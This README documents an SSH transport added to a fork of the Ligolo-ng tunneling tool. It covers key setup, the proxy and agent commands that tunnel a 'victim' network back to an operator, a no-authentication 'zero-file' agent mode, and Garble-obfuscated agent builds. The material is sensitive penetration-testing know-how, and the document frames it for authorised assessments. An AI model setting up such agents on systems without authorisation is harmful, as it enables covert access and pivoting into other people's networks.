# Ligolo-ng SSH transport

This fork adds a real SSH transport for environments where the agent can only
make outbound SSH connections. The agent is the SSH client and the proxy embeds
the SSH server. No external SSH daemon, local port forward, remote port forward,
or SOCKS proxy is required.

The SSH connection performs a standard SSH handshake and encryption. The
default mode uses public-key authentication and host-key verification. An
explicit no-auth mode is available when the victim must receive only the agent
binary. Ligolo opens a custom SSH channel named `ligolo`; the existing yamux
session and Ligolo protocol run inside that channel. TUN, TCP, UDP, ICMP,
listeners, reconnection, multiple agents, daemon mode, API, Web UI, autoroute,
and autobind therefore use the same core implementation as upstream.

## Prepare keys

Create one proxy host key and one agent identity. Keep private keys private.

```powershell
New-Item -ItemType Directory -Force .\keys
ssh-keygen -t ed25519 -f .\keys\proxy-host
ssh-keygen -t ed25519 -f .\keys\agent
Copy-Item .\keys\agent.pub .\keys\authorized_keys
ssh-keygen -lf .\keys\proxy-host.pub -E sha256
```

The last command prints the `SHA256:...` host-key fingerprint that must be
pinned on the agent. To authorize more agents, append their public keys to
`authorized_keys`.

Encrypted private keys are supported without putting passphrases on the command
line:

```powershell
$env:LIGOLO_SSH_HOST_PASSPHRASE = '<proxy-host-key-passphrase>'
$env:LIGOLO_SSH_AGENT_PASSPHRASE = '<agent-key-passphrase>'
```

## Start the proxy

Windows:

```powershell
.\proxy.exe `
  -laddr ssh://0.0.0.0:22 `
  -ssh-user ligolo `
  -ssh-host-key .\keys\proxy-host `
  -ssh-host-key-passphrase-env LIGOLO_SSH_HOST_PASSPHRASE `
  -ssh-authorized-keys .\keys\authorized_keys
```

Linux:

```bash
chmod 600 ./keys/proxy-host ./keys/authorized_keys
sudo -E ./proxy \
  -laddr ssh://0.0.0.0:22 \
  -ssh-user ligolo \
  -ssh-host-key ./keys/proxy-host \
  -ssh-host-key-passphrase-env LIGOLO_SSH_HOST_PASSPHRASE \
  -ssh-authorized-keys ./keys/authorized_keys
```

The proxy logs its SSH host-key fingerprint at startup. Port 22 normally
requires Administrator/root and may conflict with an existing OpenSSH server.
Use another allowed SSH port when necessary.

## Start an agent

Fingerprint pinning:

```powershell
.\agent.exe `
  -connect ssh://proxy.example:22 `
  -ssh-user ligolo `
  -ssh-key .\keys\agent `
  -ssh-key-passphrase-env LIGOLO_SSH_AGENT_PASSPHRASE `
  -ssh-host-key-fingerprint 'SHA256:REPLACE_WITH_VERIFIED_FINGERPRINT' `
  -retry `
  -reconnect
```

The Linux command uses the same arguments and binary name `./agent`.

Alternatively, verify through an existing OpenSSH `known_hosts` file:

```bash
./agent \
  -connect ssh://proxy.example:22 \
  -ssh-user ligolo \
  -ssh-key ./keys/agent \
  -ssh-known-hosts ~/.ssh/known_hosts \
  -retry
```

If both `-ssh-known-hosts` and `-ssh-host-key-fingerprint` are supplied, both
checks must pass. The agent refuses SSH without either check.
`-ssh-insecure-ignore-host-key` disables proxy verification and is only for
cases where the operator explicitly accepts the MITM risk.

## No agent key

The proxy always needs a host key because SSH requires one for encryption.
The victim does not need an agent key file when both sides explicitly enable
no-auth mode.

Proxy:

```powershell
.\proxy.exe `
  -laddr ssh://0.0.0.0:22 `
  -ssh-user ligolo `
  -ssh-host-key .\keys\proxy-host `
  -ssh-insecure-allow-no-auth
```

Agent with no key file but a pinned proxy fingerprint:

```powershell
.\agent.exe `
  -connect ssh://proxy.example:22 `
  -ssh-user ligolo `
  -ssh-insecure-no-auth `
  -ssh-host-key-fingerprint 'SHA256:REPLACE_WITH_VERIFIED_FINGERPRINT' `
  -retry `
  -reconnect
```

Zero-file agent command:

```powershell
.\agent.exe `
  -connect ssh://proxy.example:22 `
  -ssh-user ligolo `
  -ssh-insecure-no-auth `
  -ssh-insecure-ignore-host-key `
  -retry `
  -reconnect
```

This remains a real encrypted SSH connection, but it does not authenticate the
agent. The zero-file variant also does not authenticate the proxy and is
vulnerable to MITM. Anyone who can reach the proxy can connect. Use it only
during the assessment window and restrict the listener with firewall rules
when possible. A normal proxy rejects no-auth agents. Supplying
`-ssh-insecure-no-auth` together with `-ssh-key` is rejected as ambiguous.

Relevant defaults:

- SSH connect/handshake timeout: 20 seconds.
- Proxy handshake/initial-channel timeout: 20 seconds.
- SSH keepalive: 30 seconds; set `-ssh-keepalive 0` to disable.
- Existing Ligolo retry and reconnection flags remain unchanged.
- Public-key authentication is required unless both no-auth flags are set.
- One `ligolo` channel is accepted per SSH connection.

TLS, WebSocket, and legacy direct transports remain available for upstream
compatibility. Selecting `ssh://` uses only the SSH transport for the
agent-to-proxy connection.

## Build release binaries

The repository uses an isolated Go 1.26.5 toolchain and Garble v0.17.0. The
build script creates normal and Garble agents for Windows/Linux AMD64/ARM64:

```powershell
git submodule update --init --recursive web/ligolo-ng-web
powershell.exe -ExecutionPolicy Bypass -File .\scripts\build-release.ps1
```

Node.js/npm are required because the script performs a clean, lockfile-based
build of the embedded Web UI and refuses to package the upstream placeholder.
Use `-GoExe` and `-GarbleExe` to select different tool locations.

The script clears only this repository's `release` directory and produces:

```text
release/
  README.md
  windows-amd64/ proxy.exe agent.exe agent-garble.exe
  windows-arm64/ proxy.exe agent.exe agent-garble.exe
  linux-amd64/   proxy     agent     agent-garble
  linux-arm64/   proxy     agent     agent-garble
```

`release` contains the 12 binaries and their quick-command README.
`artifacts/SHA256SUMS` and `artifacts/build-manifest.json` record hashes, tool
versions, target tuples, and Garble seeds.

Garble agents use `-literals -tiny`. Explicit MsgPack field tags preserve the
upstream wire names after obfuscation. Obfuscation does not imply antivirus or
EDR bypass, and it does not change the GPLv3 source-distribution obligations.

## Verification

Run source tests:

```powershell
$env:PATH = "$PWD\.tools\go1.26.5\go\bin;$env:PATH"
$env:GOTOOLCHAIN = 'local'
go test ./...
go vet ./...
```

Runtime verification must use the actual binaries. At minimum:

1. Confirm the proxy presents an `SSH-2.0-...` banner.
2. Confirm an unauthorized agent key is rejected.
3. Confirm a wrong host-key fingerprint is rejected.
4. Register normal and Garble agents through `ssh://`.
5. Start a TUN and verify TCP, UDP, and ICMP over its route.
6. Verify TCP and UDP listeners in the reverse direction.
7. Stop/restart a proxy and verify agent reconnection.
8. Register multiple agents simultaneously.

ARM64 binaries are cross-built on AMD64. Treat PE/ELF architecture inspection
as structural evidence unless they are also executed on ARM64 hardware or an
emulator.
